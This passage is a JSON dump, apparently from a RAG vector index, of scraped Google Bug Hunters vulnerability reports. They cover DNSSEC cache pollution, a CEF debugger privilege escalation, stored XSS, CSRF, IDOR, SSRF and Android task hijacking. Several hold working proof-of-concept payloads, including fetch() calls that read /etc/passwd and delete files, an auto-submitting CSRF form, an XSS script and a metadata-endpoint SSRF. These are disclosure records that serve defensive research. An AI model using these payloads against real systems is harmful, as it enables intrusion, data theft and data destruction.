"D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_515431.txt", "file_name": "20250408_175710_515431.txt", "file_type": "text/plain", "file_size": 1834, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "625ed93f-3c5c-49fe-a7f9-12ba96660f06", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_515431.txt", "file_name": "20250408_175710_515431.txt", "file_type": "text/plain", "file_size": 1834, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "5406a85f11ea90ef33d3ed9379cc7643c72ab8261850cf1f9278121347493a00", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Google Public DNS\r\nGoogle VRP\r\ntriaged\r\n21:14 | Feb 1, 2022\r\naccepted\r\n20:39 | Feb 2, 2022\r\nfixed\r\n16:19 | Feb 23, 2022\r\nreward decided\r\n$5,000\r\nSummary: DNSSEC signed names are vulnerable for cache pollution\r\nSteps to reproduce:\r\nDescribed in:\r\nhttps://issuetracker.google.com/issues/214115031\r\nAttack scenario:\r\nWe discovered a method that appears to circumvent DNSSEC, thus allowing to perform cache pollution even when a domain name is protected with DNSSEC. Instead of returning a SERVFAIL, Google Public DNS returns an (insecure) answer.\r\nReproduction Steps\r\nTake a DNSSEC-signed domain (proof of concept: servfail.nl)\r\nModify the signatures, with bogus signatures\r\nImportant: also change the key tag of the RRSIGs into something else (in the PoC we change 45916 into 45918)\r\nExploitability\r\nSo, what we essentially did is simulate a hacker that by some means (Kaminsky-style perhaps) is able to reply with fake replies and fake RRSIGs. A validating resolver should normally refuse such replies (SERVFAIL). Google Public DNS does indeed do this when\r\nonly\r\nthe RRSIG is fake. But when the RRSIG is modified in such a way that key tag does\r\nalso\r\nnot match. to any present DNSKEY, Google Public DNS returns an (insecure) answer, without the AD-bit set.\r\nHere is the PoC in DNSViz:\r\nhttps://dnsviz.net/d/servfail.nl/Yd05Yw/dnssec/\r\nWe believe it should not be possible to perform cache pollution for DNSSEC-signed domains in the way as described above. Google Public DNS should return a SERVFAIL when the RRSIG is invalid.\r\nScope\r\nThis alleged vulnerability applies to DNSSEC-protected zones\r\nImpact\r\nPotentially significant impact; adversaries can circumvent DNSSEC-protection and theoretically still perform cache pollution attacks\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1818, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "aa863a64-700c-4957-90f8-49447ec353bd": {"__data__": {"id_": "aa863a64-700c-4957-90f8-49447ec353bd", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_617451.txt", "file_name": "20250408_175712_617451.txt", "file_type": "text/plain", "file_size": 4583, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cbb689e6-69c3-4c32-9c9f-73c3c51c1fcf", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_617451.txt", "file_name": "20250408_175712_617451.txt", "file_type": "text/plain", "file_size": 4583, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d3656ebae57a10982d6254f9aa9ee3af6e919e5c4f8e2924b79c8ec48fa8094c", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "2e2458ce-c4f2-4571-8703-27e2681e8f0e", "node_type": "1", "metadata": {}, "hash": "7a6b305943c86d547407827b3f3dabcee3059ba32cdc305e5fc90c78c0b9f33e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nCEF Debugger Enabled in Google Web Designer\r\nReported by:\r\nAbdel Adim `smaury` Oisfi\r\nGoogle VRP\r\ntriaged\r\n17:17 | Jan 18, 2022\r\naccepted\r\n09:34 | Jan 20, 2022\r\nfixed\r\n02:27 | Mar 11, 2022\r\nreward decided\r\n$5,000\r\nSummary:\r\nCEF Debugger Enabled in Google Web Designer\r\nProduct:\r\nGoogle Web Designer\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nDescription\r\nGoogle Web Designer is built compiled with the GEF debugger enabled.\r\nThis configuration exposes a local TCP port which (which is typically randomized across executions) where a minimal frontend and a WebSocket server are available.\r\nBy connecting to it, it is possible to run arbitrary JavaScript code inside the context of the target application (Google Web Designer).\r\nA general description of the vulnerability was very well documented by your very own Taviso here;\r\nhttps://github.com/taviso/cefdebug\r\nAttack scenario\r\nAttack Vector\r\nAs the GEF version is pretty recent and the\r\n/json/new\r\nAPI is not enabled and a DNS rebinding attack is not possible.\r\nThe only working attack vector is the the local one.\r\nIt means that the attacker must have a local shell on the victim's device as any user (this means it's very useful for privilege escalations).\r\nImpact\r\nAn attacker could:\r\nSteal the Google account refresh token (if the victim is logged in the Google Web Designer client).\r\nRead / Write / Delete / List any file and folder the victim system user has access to. This is possible as Google Web Designer implements some special APIs which are triggered when you fetch a\r\nhttps://ninja-shell/api/{file|directory}?method={read|create|save|delete|exists|...}&{file|path}=\r\nURL.\r\nProof of Concept\r\nRequirements:\r\nHave a computer with 2 different system accounts (i.e. lowpriv and regularuser)\r\nSteps to Reproduce:\r\nInstall the Google Web Designer client with\r\nregularuser\r\nOpen the Google Web Designer client with\r\nregularuser\r\nLogin with your Google Account\r\nOpen session as\r\nlowpriv\r\nwithout logging out from\r\nregularuser\r\nor closing the Google Web Designer client\r\nList the running processes (i.e. by running\r\nps auxw\r\n) and notice that the Google Web Designer is executed with the\r\n--remote-debugging-port\r\nflag, specifying a port (i.e.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2262, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2e2458ce-c4f2-4571-8703-27e2681e8f0e": {"__data__": {"id_": "2e2458ce-c4f2-4571-8703-27e2681e8f0e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_617451.txt", "file_name": "20250408_175712_617451.txt", "file_type": "text/plain", "file_size": 4583, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cbb689e6-69c3-4c32-9c9f-73c3c51c1fcf", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_617451.txt", "file_name": "20250408_175712_617451.txt", "file_type": "text/plain", "file_size": 4583, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d3656ebae57a10982d6254f9aa9ee3af6e919e5c4f8e2924b79c8ec48fa8094c", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "aa863a64-700c-4957-90f8-49447ec353bd", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_617451.txt", "file_name": "20250408_175712_617451.txt", "file_type": "text/plain", "file_size": 4583, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "14b82937522c203fbe92068273c2f7dc0907d58934ae91fba54b0bde14c6d915", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Read / Write / Delete / List any file and folder the victim system user has access to. This is possible as Google Web Designer implements some special APIs which are triggered when you fetch a\r\nhttps://ninja-shell/api/{file|directory}?method={read|create|save|delete|exists|...}&{file|path}=\r\nURL.\r\nProof of Concept\r\nRequirements:\r\nHave a computer with 2 different system accounts (i.e. lowpriv and regularuser)\r\nSteps to Reproduce:\r\nInstall the Google Web Designer client with\r\nregularuser\r\nOpen the Google Web Designer client with\r\nregularuser\r\nLogin with your Google Account\r\nOpen session as\r\nlowpriv\r\nwithout logging out from\r\nregularuser\r\nor closing the Google Web Designer client\r\nList the running processes (i.e. by running\r\nps auxw\r\n) and notice that the Google Web Designer is executed with the\r\n--remote-debugging-port\r\nflag, specifying a port (i.e.\r\n/Volumes/Google Web Designer/Google Web Designer.app/Contents/Frameworks/Google Web Designer Helper (Renderer).app/Contents/MacOS/Google Web Designer Helper (Renderer) --type=renderer --log-file=/Users/smaury/Library/Logs/Google Web Designer_debug.log --remote-debugging-port=65423 --field-trial-handle=1718379636,3111382051732477566,9981932134914610433,131072 --enable-features=CastMediaRouteProvider --lang=en --log-file=/Users/smaury/Library/Logs/Google Web Designer_debug.log --log-severity=disable --disable-spell-checking --uncaught-exception-stack-size=20 --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=5 --no-v8-untrusted-code-mitigations --shared-files --seatbelt-client=44\r\n)\r\nOpen a browser pointing to\r\nhttp://localhost\r\n:<port> where\r\n<port>\r\nis the one observed in the previous step\r\nClick on \"Google Web Designer\"\r\nIn the Console tab paste the following code:\r\nfetch(\"https://ninja-shell/api/file?method=read&file=%2Fetc%2fpasswd\").then(response => response.text()).then(data => console.log(data));\r\nNotice that the content of the file\r\n/etc/passwd\r\nis shown\r\nIn the Console tab paste the following code\r\nfetch(\"https://ninja-shell/api/file?method=delete&file=%2Ftmp/test\", {\r\n\"headers\": {\r\n\"content-type\": \"application/x-www-form-urlencoded;charset=UTF-8\"\r\n},\r\n\"referrer\": \"https://prodc.webdesignerauth.withgoogle.com/?livestream=0\",\r\n\"referrerPolicy\": \"no-referrer-when-downgrade\",\r\n\"body\": \"AAAA\",\r\n\"method\": \"PUT\",\r\n\"mode\": \"cors\",\r\n\"credentials\": \"omit\"\r\n});\r\nfetch(\"https://ninja-shell/api/file?method=create&file=%2Ftmp/test\", {\r\n\"headers\": {\r\n\"content-type\": \"application/x-www-form-urlencoded;charset=UTF-8\"\r\n},\r\n\"referrer\": \"https://prodc.webdesignerauth.withgoogle.com/?livestream=0\",\r\n\"referrerPolicy\": \"no-referrer-when-downgrade\",\r\n\"body\": \"AAAA\",\r\n\"method\": \"PUT\",\r\n\"mode\": \"cors\",\r\n\"credentials\": \"omit\"\r\n});\r\nNotice that the file\r\n/tmp/test\r\nis deleted and then re-created with\r\nAAAA\r\nas content\r\nThe file creation/edit ability is very important as it could be used to elevate the privileges from\r\nlowpriv\r\nto\r\nregularuser\r\nby adding an SSH key or a cronjob or some code in the dotfiles (\r\n.bashrc\r\n,\r\n.bash_profile\r\n, etc.) file of\r\nregularuser\r\n.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 1403, "end_char_idx": 4567, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ac9f3a6d-e2fa-45f5-8a2d-050b4dc83049": {"__data__": {"id_": "ac9f3a6d-e2fa-45f5-8a2d-050b4dc83049", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_648702.txt", "file_name": "20250408_175712_648702.txt", "file_type": "text/plain", "file_size": 2025, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "83672024-a890-4545-b120-740588085375", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_648702.txt", "file_name": "20250408_175712_648702.txt", "file_type": "text/plain", "file_size": 2025, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "59a1f4f4efcbd068ae584c96c7bd889e8804c64e82b199d5b4b2ef27ac7339dd", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in mitre.siemplify.co\r\nReported by:\r\nVaidik Pandya\r\nGoogle VRP\r\ntriaged\r\n00:42 | Jan 11, 2022\r\naccepted\r\n18:29 | Jan 11, 2022\r\nfixed\r\n14:40 | Jan 21, 2022\r\nHey there,\r\nI am [REDACTED_NAME] i am a bug hunter and a security researcher.\r\nEmail: [REDACTED_EMAIL_ADDRESS]\r\nMobile:  [REDACTED_PHONE_NUMBER]\r\nVulnerability Name : Stored XSS and HTMLi\r\nVulnerable Domain :\r\nhttps://mitre.siemplify.co/org/8/user\r\nWhat is Cross site scripting?\r\nStored XSS, also known as persistent XSS, is the more damaging than non-persistent XSS. It occurs when a malicious script is injected directly into a vulnerable web application.\r\nWhat is HTML injection?\r\nHypertext Markup Language (HTML) injection is a technique used to take advantage of non-validated input to modify a web page presented by a web application to its users. When applications fail to validate user data, an attacker can send HTML-fomatted text to modify site content that gets presented to other users.\r\nSteps to Reproduce:\r\ngo to\r\nhttps://mitre.siemplify.co/org/8/user\r\ngo to edit profile and add a payload of xss or htmli after the name \r\nHTMLi Payload = <img src=\"https://images.pexels.com/photos/103123/pexels-photo-103123.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500\"> \r\nXSS Payload = <script>alert(document.domain)</script>\r\nhere you an see the xss now we can also perform htmli here\r\n [ Video attched ] drive link =\r\nhttps://drive.google.com/file/d/12-ClLyUILfFIBke8C55Kh1VLNuAF1SDJ/view?usp=sharing\r\nReferences:\r\nhttps://hackerone.com/reports/485748\r\nhttps://hackerone.com/reports/381553\r\nImpact:\r\nJust like Cross-site Scripting, an HTML injection happens when the payload supplied by the malicious user as part of untrusted input is executed client-side by the web browser as part of the HTML code of the web application. attacker could redirect users and then execute xss and control them easily, also could include his videos to get views\r\nAcquisition info:\r\nWeb refrences\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2009, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "092606bd-e087-4cf3-bae6-f65b678c60c3": {"__data__": {"id_": "092606bd-e087-4cf3-bae6-f65b678c60c3", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_695869.txt", "file_name": "20250408_175712_695869.txt", "file_type": "text/plain", "file_size": 1228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f61f67f4-6fa9-4633-a331-1ce0bbe3bb48", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_695869.txt", "file_name": "20250408_175712_695869.txt", "file_type": "text/plain", "file_size": 1228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c5de5a4e85f720843a26f0f3a6ca5a09ce6b2ba25a0b22a4fc885a1bd162d7aa", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in YouTube Studio\r\nReported by:\r\nIssam Hbib\r\nGoogle VRP\r\ntriaged\r\n16:22 | Jan 3, 2022\r\naccepted\r\n19:58 | Jan 7, 2022\r\nfixed\r\n22:40 | Jan 22, 2022\r\nSummary: Task Hijacking on launch due to missing taskAffinity on com.google.android.apps.youtube.creator.main.MainActivity\r\nSteps to reproduce: an App like this\r\nhttps://github.com/elye/demo_android_issue_strandhogg_ver_1/blob/main/AttackerApp/app/src/main/AndroidManifest.xml\r\nChange android:taskAffinity to \"com.google.android.apps.youtube.creator\"\r\nStart the attacker app\r\nThen start Youtube Studio and see it opens attacker apps activity\r\nAttack scenario:\r\nStep 1: The attacker tricks victims to install his malicious app either through a third party app store or by contacting the them e.g per sms. \r\n2: One of the victims will inevitabely install the app and open it.\r\n3: Afterwards they will open Youtube Studio.\r\nThe attackers goal is not to target a certain victim but more spray attack until one of the victims fall into his trap. Since the malicious activity is now active, the attacker can imitate Youtube Studio to either gain access to the account or to get sensitive data.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1212, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "40d0823c-600b-4683-bcf9-4d07aee0bf78": {"__data__": {"id_": "40d0823c-600b-4683-bcf9-4d07aee0bf78", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_727301.txt", "file_name": "20250408_175712_727301.txt", "file_type": "text/plain", "file_size": 2921, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "503f42e7-7cfa-4732-b3f4-2d8add9a3581", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_727301.txt", "file_name": "20250408_175712_727301.txt", "file_type": "text/plain", "file_size": 2921, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c533c5fe57929b20207ab6d582ddd126ec7e002b7e1f57afebe44f83d636bbad", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nA csrf in exporteducationprogram.googlecnapps.cn  leads to deleting  user data\r\nReported by:\r\nakihi\r\nGoogle VRP\r\ntriaged\r\n18:16 | Dec 30, 2021\r\naccepted\r\n19:21 | Dec 31, 2021\r\nfixed\r\n23:42 | Aug 2, 2022\r\nreward decided\r\n$100\r\nSummary:\r\nA csrf in exporteducationprogram.googlecnapps.cn  leads to deleting  user data\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nGrow\r\nURL:\r\nhttps://exporteducationprogram.googlecnapps.cn/\r\nVulnerability type:\r\nCross-site request forgery (CSRF)\r\nDetails\r\na csrf  in exporteducationprogram.googlecnapps.cn  leads  to deleting user data\r\nrelevant url:\r\nhttps://exporteducationprogram.googlecnapps.cn/appacademy/home?utm_source=wechat&utm_medium=wechat_menu_bar&utm_campaign=ewg_online_training_platform&openid=oQJ0wsxRtjc-I6r6NelZ6swbgCrk\r\nclick the button\r\nDelete Data\r\nin that page, the request package can be captured as follows:\r\nPOST /appacademy/api/clear HTTP/1.1\r\nHost: exporteducationprogram.googlecnapps.cn\r\nConnection: close\r\nContent-Length: 2\r\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"\r\nAccept: application/json, text/plain,\r\n/\r\nContent-Type: application/x-www-form-urlencoded\r\nsec-ch-ua-mobile: ?0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\nsec-ch-ua-platform: \"Windows\"\r\nOrigin:\r\nhttps://exporteducationprogram.googlecnapps.cn\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\nReferer:\r\nhttps://exporteducationprogram.googlecnapps.cn/appacademy/home?utm_source=wechat&utm_medium=wechat_menu_bar&utm_campaign=ewg_online_training_platform&openid=\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7\r\nCookie: aa-session=\"eyJhYV9pc19lbnJvbGwiOnRydWUsImFhX3VzZXJfaWQiOiI1OTQ1ODk0MTU1MzIxMzQ0IiwiYWFfaXNfd2hpdGVsaXN0IjpmYWxzZX0\\075|1640841511|591ee02f37f3fe7e7c36111cb1bb5927c32cad47\"\r\n{}\r\n'\r\nIt is vulnerable to a csrf, and the poc:\r\n<html>\r\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\r\n  <body>\r\n  <script>history.pushState('', '', '/')</script>\r\n    <form action=\"https://exporteducationprogram.googlecnapps.cn/appacademy/api/clear\" method=\"POST\">\r\n    <input id=\"submit0\" type=\"submit\" value=\"Submit request\" />\r\n      <script> window.onload=function(){\r\n\r\n                document.getElementById(\"submit0\").click();\r\n\r\n                }     \r\n        </script>\r\n         </form>\r\n</html>\r\nuser visit other websites which have evil html like the csrf poc , and then user data like Course learning progress data on this website will be deleted. It will give bad experience on user.\r\nAttack scenario\r\nuser visit other websites which have evil html like the csrf poc , and then user data like Course learning progress data on this website will be deleted. It will give bad experience on user.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2905, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d811b36f-f5ec-4e1c-89b8-46727e4f40e8": {"__data__": {"id_": "d811b36f-f5ec-4e1c-89b8-46727e4f40e8", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_774594.txt", "file_name": "20250408_175712_774594.txt", "file_type": "text/plain", "file_size": 1807, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "82fb0311-8900-45f3-858f-fb8fe32932d4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_774594.txt", "file_name": "20250408_175712_774594.txt", "file_type": "text/plain", "file_size": 1807, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "ccd47f43c65ebb0c2005470142b4074ee8e4ca5e6f3b58b1067c1c00b1f0a54b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nIDOR in primer.googlecnapps.cn leads to change user's skill\r\nReported by:\r\nakihi\r\nGoogle VRP\r\ntriaged\r\n20:20 | Dec 29, 2021\r\naccepted\r\n19:22 | Dec 31, 2021\r\nfixed\r\n18:39 | Sep 15, 2022\r\nreward decided\r\n$500\r\nSummary:\r\nIDOR in primer.googlecnapps.cn leads to change user's skill\r\nProduct:\r\nhttps://primer.googlecnapps.cn/\r\nURL:\r\nhttps://primer.googlecnapps.cn/primer/wechat/updateSelectedSkillsAndAuthStutas\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nIDOR in primer.googlecnapps.cn leads to change user's skills\r\nurl:\r\nhttps://primer.googlecnapps.cn/primer/wechat/updateSelectedSkillsAndAuthStutas\r\nrelevant product: \r\nwechat miniprogram:\r\n\u8c37\u6b4c\u6210\u957f\u6307\u5357\r\nafter opening the wechat miniprogram:\r\n\u8c37\u6b4c\u6210\u957f\u6307\u5357\r\nin wechat,  you can request the package  as follows in manageing skills.\r\nPOST /primer/wechat/updateSelectedSkillsAndAuthStutas HTTP/1.1\r\nHost: primer.googlecnapps.cn\r\nConnection: close\r\nContent-Length: 162\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 MicroMessenger/7.0.9.501 NetType/WIFI MiniProgramEnv/Windows WindowsWechat\r\ncontent-type: application/json\r\nReferer:\r\nhttps://servicewechat.com/wx7dbcdf859b383726/60/page-frame.html\r\nAccept-Encoding: gzip, deflate\r\n{\"userIdEncrypt\":\"[REDACTED_ID]\",\"userId\":[REDACTED_ID],\"selectedSkillInfo\":[6279416820793344,5412462388051968,5816948650672128],\"checkDiffer\":true}\r\nThe value of userIdEncrypt is the BASE64 encoding of userId. Modifying  others' skill  can be done by changing the value of userIdEncrypt and userId  as others'.\r\nAttack scenario\r\nIt is easy to modify the user's skill.And system recommand courses by skills.This will cause bad experience for users.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1767, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fa4b85fe-c01a-41c0-97bb-3dc29a87f524": {"__data__": {"id_": "fa4b85fe-c01a-41c0-97bb-3dc29a87f524", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_806225.txt", "file_name": "20250408_175712_806225.txt", "file_type": "text/plain", "file_size": 2876, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5a2c0663-b2bc-4f50-b017-0dbbc82478a1", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_806225.txt", "file_name": "20250408_175712_806225.txt", "file_type": "text/plain", "file_size": 2876, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "aec1293c50153cc717899801f0ee7240276a8615aaadc4c57c431c7d7362740d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nServer side request forgery in Adding apigee account sources in appsheet.com, This endpoint allow us to add an apikey of apigee and api url and it will make http request to that third party url .\r\nReported by:\r\nBasavaraj Banakar\r\nGoogle VRP\r\ntriaged\r\n19:47 | Dec 2, 2021\r\naccepted\r\n23:47 | Dec 3, 2021\r\nfixed\r\n09:54 | Jan 29, 2022\r\naccepted\r\n07:11 | Feb 10, 2022\r\nfixed\r\n23:50 | Apr 18, 2022\r\nreward decided\r\n$1,500\r\nSummary:\r\nServer side request forgery in Adding apigee account sources in appsheet.com, This endpoint allow us to add an apikey of apigee and api url and it will make http request to that third party url .\r\nProduct:\r\nappsheet.com\r\nURL:\r\nhttps://www.appsheet.com/Account/ApigeeAuthInfo?state=8d8254a0-f6fc-4ee9-9895-28b77c9869b6#openapi\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nDescription\r\n: Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.\r\nIn a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.\r\nBut here we as an attacker able to extract partial google cloud metadata and able to make requests for internal resources\r\nSteps to reproduce\r\n:\r\n1.Login to your account in appsheet.com .\r\n2.Navigate to my account section & click on new data source.\r\n3.Now select apigee and select Authorization Type as apikey.\r\n4.Now add any random words in apikey.\r\n5.Enter your burp collaborator address in OpenAPI Spec URL and click on validate .\r\n6.Now you can see in the response its rendered that burp collaborator url and made request for that url.\r\n7.Now add google cloud metadata url in OpenAPI Spec URL(Because this website is hosted on google cloud)\r\ni.e\r\nhttp://169.254.169.254\r\nBy clicking on validate you can able to see that metadata version folder and computemetadata folder in response error.\r\nProof of concept\r\n: Check the below google drive link\r\nhttps://drive.google.com/file/d/12LQoOk12Zgg3hKOxGFsrdVYu2qEGF6Fd/view?usp=sharing\r\nAttack scenario\r\nImpact\r\n: As of now as an attacker I cant able to extract full metadata of google cloud due to some restrictions(Like public access preventions may be) but if Any attacker find the way to bypass the restrictions he will easily get access to very sensitive information about appsheet & any attacker can make request to internal resources.\r\nPlanned disclosure date:\r\nFri Dec 31 2021 00:00:00 GMT+0530 (India Standard Time)\r\nReporter would like to donate a possible VRP reward to charity.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": 